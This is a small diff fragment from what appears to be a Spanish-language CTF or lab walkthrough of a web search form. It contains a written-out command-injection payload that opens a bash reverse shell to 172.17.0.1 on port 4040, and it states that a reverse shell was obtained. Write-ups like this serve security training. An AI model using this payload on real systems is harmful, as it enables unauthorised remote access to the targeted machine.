@@ -17,4 +17,5 @@ Al entrar, podemos ver que la web se compone unicamente de un buscador, por lo q
 ;bash -c 'bash -i >& /dev/tcp/172.17.0.1/4040 0>&1'
 ```
 ![Shell injection](images/img2.png)
+
 Logrando asi obtener una reverse shell.
